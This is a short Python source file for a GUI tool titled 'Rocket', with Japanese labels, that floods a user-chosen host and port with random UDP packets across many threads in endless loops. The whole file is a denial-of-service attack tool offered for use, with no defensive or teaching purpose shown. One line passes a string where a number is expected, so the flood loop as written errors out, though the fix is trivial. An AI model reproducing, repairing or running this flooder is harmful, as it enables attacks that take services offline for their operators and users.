from secrets import choice
import tkinter as tk
import os
import random
import socket
import threading
import psutil

def attack(event):
    for y in range(int(Entry5.get())):
        th = threading.Thread(target = run)
        th.start()
        
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		cpu = psutil.cpu_percent(interval=1)
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(Entry1.get()),int(Entry2.get()))
			for x in range(Entry4.get()):
				s.sendto(data,addr)
				
			print("Sent!!!"+" cpu使用率:"+str(cpu))
		except:
			print("Error!!!"+" cpu使用率:"+str(cpu))



app = tk.Tk()
app.title("Rocket ver.0.0.")

app.resizable(width=False, height=False)

Static1 = tk.Label(text=u'▼ホストかIP▼')
Static1.pack()

# Entryを出現させる
Entry1 = tk.Entry()
Entry1.pack()

Static2 = tk.Label(text=u'▼ポート▼')
Static2.pack()

Entry2 = tk.Entry()
Entry2.pack()

Static4 = tk.Label(text=u'▼1接続あたりのパケット数▼')
Static4.pack()

Entry4 = tk.Entry()
Entry4.pack()

Static5 = tk.Label(text=u'▼スレッド数▼')
Static5.pack()

Entry5 = tk.Entry()
Entry5.pack()

Button1 = tk.Button(text=u'発射', width=50)
Button1.bind("<Button-1>", attack)        # ボタンが押されたときに実行される関数をバインドします
Button1.pack()

app.mainloop()



  
  
